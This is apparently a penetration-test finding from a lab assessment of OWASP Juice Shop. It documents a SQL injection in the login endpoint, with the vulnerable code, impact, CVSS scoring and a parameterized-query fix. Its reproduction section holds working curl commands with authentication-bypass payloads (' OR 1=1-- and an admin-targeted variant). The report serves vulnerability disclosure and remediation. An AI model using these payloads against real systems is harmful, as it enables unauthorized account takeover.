# Finding 01 — SQL Injection in login allows authentication bypass

| | |
|---|---|
| **ID** | VL-01 |
| **OWASP Top 10 (2021)** | A03:2021 – Injection |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **Severity** | **Critical** |
| **CVSS 3.1** | 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **Affected component** | `POST /rest/user/login` → `routes/login.ts` |
| **Status** | Open → Fixed (see `fixes/01-sqli-login-auth-bypass.md`) |

## Summary

The login endpoint builds its SQL query by concatenating the user-supplied `email`
field directly into a raw SQL string. An attacker can inject SQL syntax into `email`
to subvert the `WHERE` clause and authenticate as an arbitrary user — including the
administrator — without knowing any password.

## Affected code (vulnerable)

`routes/login.ts` constructs the lookup as a raw string:

```ts
models.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
  { model: UserModel, plain: true }
)
```

The `email` value is interpolated with no escaping or parameterization.

## Reproduction

Target: local lab instance at `http://localhost:3001`.

1. Send a login request whose `email` field closes the string literal and comments
   out the password check:

   ```bash
   curl -s -X POST http://localhost:3001/rest/user/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"'"'"' OR 1=1--","password":"anything"}'
   ```

   The `'"'"' OR 1=1--` payload is the literal `' OR 1=1--`.

2. **Vulnerable result:** the server returns HTTP `200` with an `authentication`
   object containing a valid JWT and the first user's profile — the query collapses to
   `... WHERE email = '' OR 1=1-- ...`, which matches every row and returns the first
   (the administrator).

3. To target the admin specifically:

   ```bash
   curl -s -X POST http://localhost:3001/rest/user/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"admin@juice-sh.op'"'"'--","password":"x"}'
   ```

4. **Patched result:** HTTP `401 Unauthorized` — the injected characters are treated
   as a literal email value, no row matches, and no token is issued.

The regression script `scripts/test_01_sqli_login.py` automates this check.

## Impact

- Full authentication bypass; login as any user, including `admin@juice-sh.op`.
- With an admin JWT, the attacker reaches administrative functionality and every
  user's data — a complete compromise of application confidentiality and integrity.
- The same injection point can be extended to UNION-based data extraction from other
  tables.

## Remediation

Use a **parameterized query** so user input is bound as data, never parsed as SQL.
Sequelize supports named/positional `replacements`. See
`fixes/01-sqli-login-auth-bypass.md` for the patch. Defense in depth: validate the
`email` field against an email format before it reaches the data layer.

## References

- OWASP Top 10 A03:2021 – Injection
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89
